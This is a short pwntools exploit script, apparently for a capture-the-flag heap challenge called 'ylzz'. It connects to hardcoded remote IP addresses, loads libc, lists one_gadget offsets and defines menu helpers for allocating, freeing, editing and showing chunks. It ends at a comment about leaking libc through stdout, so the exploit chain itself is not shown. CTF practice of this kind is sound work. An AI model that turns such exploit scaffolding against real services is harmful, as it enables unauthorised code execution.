#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

#context.terminal = ['tmux','splitw','-v']
context.log_level = 'debug'

#io = process('./ylzz')
#io = remote('112.126.71.170',45123)
io = remote('8.131.69.237',45123)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one = [0x45226,0x4527a,0xf0364,0xf1207]

def add():
    io.sendline('1')

def dele(idx):
    io.sendline('2')
    io.sendline(str(idx))

def edit(idx,con):
    io.sendline('3')
    io.sendline(str(idx))
    io.send(con)

def show(idx):
    io.sendline('4')
    io.sendline(str(idx))
    return io.recv()

def do_glob(pattern):
    io.sendline('5')
    io.sendline(pattern)

#no pie protect, use stdout to leak libc

